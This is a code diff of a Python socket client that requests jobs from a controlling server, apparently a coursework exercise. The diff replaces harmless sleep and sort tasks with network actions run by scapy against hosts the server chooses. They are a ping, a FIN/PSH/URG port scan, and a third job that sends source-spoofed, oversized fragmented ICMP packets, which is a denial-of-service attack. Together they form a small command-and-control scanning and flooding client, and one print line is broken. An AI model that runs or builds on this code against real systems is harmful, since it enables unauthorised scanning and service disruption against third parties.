@@ -1,65 +1,116 @@
 import socket
-import random
 import time
 import sys
+import pickle
+import argparse
+from scapy.all import *
 
 PORT = 6000
-FORMAT = 'utf-8'
-SERVER = socket.gethostbyname(socket.gethostname())#gets ip
-DISCONNECT = "qerty1234" #shared disconnect message
+SERVER = socket.gethostbyname(socket.gethostname()) # Get IP
 ADDR = (SERVER, PORT) 
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#creates client socket
-client.connect(ADDR) #connects socket to remote host
+conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create client socket
+conn.connect(ADDR) # Connects socket to remote host
+print(f"Connected to server @ {ADDR}\n")
 val = "y"
-jobList = ["job 1","job 2", "job 3"]
 
-def send(msg): #function to send messages to jobcreator
-    message = msg.encode(FORMAT) 
-    client.send(message) 
-    received = client.recv(2048).decode(FORMAT)
-    print(received)
-    if received.find("job 1") != -1:
-        job1()
-    elif received.find("job 2") != -1:
-        job2()
-    elif received.find("job 3") != -1:
-        job3()
-    elif received.find("terminated") != -1:
-        sys.exit(1)
-    elif received == ("unavailable"):
-        print("waiting for job to be available")
-        send("understood awaiting for job")
+# --- Shared Messages ---
+
+DISCONNECT =        "disconnect"
+JOB_REQUEST =       "jobrequest"
+JOB_REPORT =        "jobreport"
+JOB_COMPLETE =      "completed"
+JOB_INCOMPLETE =    "incomplete"
+JOB_ASSIGNMENT =    "assignment"
+JOB_SUCCESS =       "success"
+JOB_FAILURE =       "failure"
+COMPLETION_ACK =    "goodjob"
+
+# --- Function Definitions ---
+
+def send(v): # Function to send messages to the server
+    # Pickle the message
+    m = pickle.dumps(v)
+    conn.send(m)
+
+    if v[0] == DISCONNECT: 
+        print(f"Disconnecting from server @ {ADDR}")
+        val = "n"
+    else: 
+        print(f"Waiting for server @ {ADDR}\n")
+        m = conn.recv(2048)
+        v = pickle.loads(m)
+        if v[0] == JOB_ASSIGNMENT:
+            print(f"Received a job assignment from server @ {ADDR}")
+            if v[1] == 1:
+                job1(v)
+            elif v[1] == 2:
+                job2(v)
+            elif v[1] == 3:
+                job3(v)
+        elif v[0] == COMPLETION_ACK:
+            print(f"Server @ {ADDR} acknowledged completion\n")
         
+def job1(v):
+    print(f"\nWorking on job 1 for @ {ADDR}")
+    host = v[2]
+    print(f"\nPinging host @ {host}")
+    p = sr1(IP(dst=host,ttl=20)/ICMP(), timeout=2, verbose=0)
+    
+    if p == None:
+        print(f"The host @ {host} is not online.\n")
+        send([ JOB_REPORT, JOB_COMPLETE, JOB_FAILURE ])
+    else:
+        print(f"The host @ {host} is online.\n")
+        send([ JOB_REPORT, JOB_COMPLETE, JOB_SUCCESS ])
         
+def job2(v):
+    print(f"\nWorking on job 2 for @ {ADDR}")
+    host = v[2]
+    port = v[3]
+    sport = RandShort()
+
+    print(f"Scanning {host}:{port} from :{sport}")
+
+    pkt = sr1(IP(dst=host)/TCP(sport=sport, dport=port, flags="FPU"), timeout=1, verbose=0)
+    
+    if pkt != None:
+        if pkt.haslayer(TCP):
+            if pkt[TCP].flags == 20:
+                send([ JOB_REPORT, JOB_COMPLETE, "Closed" ])
+            else:
+                print("port, TCP flag {pkt[TCP].flag|")
+        elif pkt.haslayer(ICMP):
+            send([ JOB_REPORT, JOB_COMPLETE, "ICMP resp / filtered"])
+        else:
+            send([ JOB_REPORT, JOB_COMPLETE, "Unknown resp"])
+    else:
+        send([ JOB_REPORT, JOB_COMPLETE, "Open / filtered"])
+    
     
 
-        
-#jobs that the seeker can do?       
-def job1():
-    print("Job Description: wait for 10 seconds ya goob")
-    time.sleep(10)
-    send("job 1 Completed Successfully :)")
+def job3(v):
+    print(f"Working on job 3 for @ {ADDR}")
+    try:
+      ip_layer = IP(dst=v[2], src='192.168.2.1')
+      icmp_layer = ICMP()
+      packet = ip_layer/icmp_layer
+      scapy.all.send(fragment(packet /("X"*60000)), count = 3)
+      send([ JOB_REPORT, JOB_COMPLETE, JOB_SUCCESS ])
+    except:
+      send([ JOB_REPORT, JOB_COMPLETE, JOB_FAILURE ])
 
-def job2():
-    print("Job Description: sort a string")
-    msg = "wow dude"
-    sorted_number = sorted(msg)
-    print(f"job 2 Completed...\nOriginal String: [{msg}] Numbers are now sorted Successfully: {sorted_number}")
-    send(f"job 2 Completed Successfully")
 
-def job3():
-    print("Job Description: wait 20 seconds")
-    time.sleep(20)
-    send("job 3 Completed Successfully :)")
+
+# --- Start ---
 
 try:
     while True:
-        val = input("Want a stupid job y/n")
+        val = input("Would you like a job? (y/n): ")
         if val == "y":
-            send(random.choice(jobList))
+            send([ JOB_REQUEST ])
         else:
-            sys.exit(1)
-
+            send([ DISCONNECT ])
+            sys.exit(0)
 except:
     sys.exit(1)
 
